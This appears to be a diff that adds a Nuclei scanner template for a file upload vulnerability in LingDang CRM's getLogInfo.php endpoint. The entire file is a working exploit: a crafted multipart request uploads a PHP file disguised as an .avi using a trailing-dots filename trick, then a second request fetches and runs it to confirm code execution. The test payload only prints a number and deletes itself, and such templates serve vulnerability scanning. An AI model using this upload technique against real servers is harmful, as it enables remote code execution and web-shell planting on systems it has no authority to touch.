@@ -1,0 +1,49 @@
+id: lingdangCRM-getLogInfo-File-upload
+
+info:
+  name: lingdangCRM-getLogInfo-File-upload
+  author: xxx
+  severity: high
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+  sessionvalue: "uploadfile{{username}}.php......"
+  md5_payload: "{{md5(sessionvalue)}}"
+
+http:
+  - raw:
+      - |
+        POST /crm/WeiXinApp/CallRecordLog/getLogInfo.php?userid=&gettype=uploadfile&uploadfilename={{username}}.php......&callednumber=&sessionvalue={{md5_payload}} HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="uploaded_file"; filename="{{username}}.avi"
+        Content-Type: image/jpeg
+
+        <?php print(111*222);unlink(__FILE__);?>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+    extractors:
+       - type: regex 
+         part: body
+         name: time
+         group: 1
+         regex:
+           - '(storage/mobilecalllog/\b\d{4}/\d{2}/\d{1,2}\b)'
+         internal: true
+  - raw:
+      - |
+        GET /crm/{{time}}/{{username}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
